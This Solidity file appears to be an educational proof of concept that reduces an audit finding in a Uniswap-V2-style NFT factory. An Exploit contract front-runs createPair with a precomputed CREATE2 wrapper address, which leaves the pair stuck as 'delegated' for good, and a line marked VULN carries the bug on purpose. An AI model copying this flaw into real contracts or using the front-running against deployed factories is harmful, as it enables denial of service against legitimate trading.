// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Sweep n Flip (UniswapV2-NFT) — Premature createPair creates unusable
    delegated pairs (Cantina, Nov 2024; finding #46466)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: UniswapV2Factory.createPair can be called with a PRECOMPUTED
    CREATE2 wrapper address BEFORE createWrapper has registered it. Because
    the factory only treats known wrappers as native pairs, a precomputed
    (not-yet-registered) address is marked as a delegated external-DEX pair.
    After the real createWrapper deploys at that same address, the pair is
    permanently stuck as delegated and unusable on Sweep n Flip.

    Bug line preserved with @> VULN. Harm: permanent DoS of a legitimate
    ERC721-wrapper trading pair (delegates mapping true after real wrapper).
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal WERC721 wrapper deployed via CREATE2 by the factory.
contract WERC721 {
    address public immutable collection;

    constructor(address collection_) {
        collection = collection_;
    }
}

/// @dev Minimal ERC20 stand-in (quote token).
contract MockERC20 {
    string public name = "USDC";
    string public symbol = "USDC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

/// @dev Minimal NFT collection stand-in.
contract MockERC721 {
    string public name = "Apes";
    string public symbol = "APE";
}

/// @notice Reduced UniswapV2Factory — createPair + createWrapper.
///         Faithful to the finding: wrapper addresses are CREATE2-predictable,
///         and createPair marks unknown (non-wrapper) tokens as delegated.
contract UniswapV2Factory {
    mapping(address => mapping(address => address)) public getPair;
    mapping(address => mapping(address => bool)) public delegates;
    mapping(address => bool) public isWrapper;
    address[] public allPairs;

    event PairCreated(address indexed token0, address indexed token1, address pair, uint256);
    event WrapperCreated(address indexed collection, address wrapper);

    /// @dev CREATE2-predict the WERC721 address for a collection.
    ///      Initcode = creationCode || abi.encode(collection) — must match createWrapper deploy.
    function computeWrapperAddress(address collection) public view returns (address) {
        bytes32 salt = keccak256(abi.encodePacked(collection));
        bytes32 bytecodeHash = keccak256(abi.encodePacked(type(WERC721).creationCode, abi.encode(collection)));
        return address(
            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, bytecodeHash))))
        );
    }

    /// @notice Create a trading pair. Ideal flow: createWrapper first, then createPair.
    ///         If neither token is a registered wrapper, the pair is marked DELEGATED
    ///         (external DEX) — and that mapping is never cleared.
    function createPair(address tokenA, address tokenB) external returns (address pair) {
        require(tokenA != tokenB, "IDENTICAL");
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        require(token0 != address(0), "ZERO");
        require(getPair[token0][token1] == address(0), "EXISTS");

        // FIX: require isWrapper for NFT side, or merge createWrapper+createPair;
        //      or verify extcodehash matches WERC721 bytecode before delegating.
        if (!isWrapper[token0] && !isWrapper[token1]) {
            delegates[token0][token1] = true; // @> VULN: marks precomputed (unregistered) wrapper as delegated forever
            delegates[token1][token0] = true;
        }

        // Deploy a minimal pair placeholder (address identity only).
        pair = address(uint160(uint256(keccak256(abi.encodePacked(token0, token1, allPairs.length)))));
        // Store a non-zero sentinel so EXISTS check works (use this contract as stand-in).
        // Real Uniswap deploys a Pair; we only need getPair / delegates state for the harm.
        getPair[token0][token1] = address(this);
        getPair[token1][token0] = address(this);
        allPairs.push(address(this));
        emit PairCreated(token0, token1, address(this), allPairs.length);
        return address(this);
    }

    /// @notice Deploy a CREATE2 WERC721 wrapper for an ERC721 collection.
    function createWrapper(address collection) external returns (address wrapper) {
        bytes32 salt = keccak256(abi.encodePacked(collection));
        wrapper = address(new WERC721{salt: salt}(collection));
        isWrapper[wrapper] = true;
        emit WrapperCreated(collection, wrapper);
    }
}

/// @dev Attacker / driver. Precomputes wrapper, front-runs createPair, then
///      shows the real createWrapper leaves the pair permanently delegated.
contract Exploit {
    UniswapV2Factory public factory;
    MockERC20 public usdc;
    MockERC721 public apes;
    address public precomputedWrapper;
    address public realWrapper;

    constructor() {
        factory = new UniswapV2Factory();
        usdc = new MockERC20();
        apes = new MockERC721();
    }

    function run() external {
        // 1. Precompute the CREATE2 wrapper address for the target NFT collection.
        precomputedWrapper = factory.computeWrapperAddress(address(apes));
        require(precomputedWrapper.code.length == 0, "wrapper must not exist yet");

        // 2. Front-run: createPair with the precomputed (not-yet-registered) wrapper.
        factory.createPair(address(usdc), precomputedWrapper);

        // 3. Legitimate createWrapper deploys at the SAME address.
        realWrapper = factory.createWrapper(address(apes));
        require(precomputedWrapper == realWrapper, "CREATE2 address mismatch");
        require(factory.isWrapper(realWrapper), "wrapper should now be registered");

        // HARM: the pair was permanently marked delegated during the premature
        // createPair — even though the wrapper is now a real registered WERC721.
        // Legitimate Sweep n Flip trading for this collection is DoS'd.
        require(
            factory.delegates(address(usdc), precomputedWrapper) == true,
            "harm not demonstrated: pair should be stuck as delegated"
        );
        require(
            factory.delegates(precomputedWrapper, address(usdc)) == true,
            "harm not demonstrated: reverse delegates should also be true"
        );
    }
}
